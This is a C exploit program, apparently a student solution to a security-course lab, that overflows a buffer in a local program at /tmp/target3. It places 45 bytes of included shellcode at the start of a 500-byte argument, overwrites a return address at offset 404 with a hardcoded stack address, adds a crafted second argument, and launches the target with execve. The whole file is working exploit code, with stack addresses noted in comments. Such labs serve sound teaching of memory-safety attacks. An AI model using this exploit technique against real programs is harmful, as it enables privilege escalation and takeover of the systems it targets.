#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

#define LEN1 500
#define LEN2 15

char payload1[LEN1];
char payload2[LEN2];

int main(void) {
  char *args[] = { TARGET, payload1, payload2, NULL };
  char *env[] = { NULL };

  int i = 0;
  for (i = 0; i < LEN1; i++)
  {
    payload1[i] = 'A';
  }

  // buf: 0xbffffb00
  // ret: 0xbffffc94


  // foo buf = 0xbffffad0
  for (i = 0; i < 45; i++)
  {
    payload1[i] = shellcode[i];
  } //0x895e1feb

  payload1[404] = 0xd0;
  payload1[405] = 0xfa;
  payload1[406] = 0xff;
  payload1[407] = 0xbf;

  // foo eip = 0xbffffc64

  payload2[0] = '6';
  payload2[1] = '5';
  payload2[2] = '9';
  payload2[3] = '3';
  payload2[4] = '5';
  payload2[5] = 0;
  payload2[6] = 0x5c;


  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
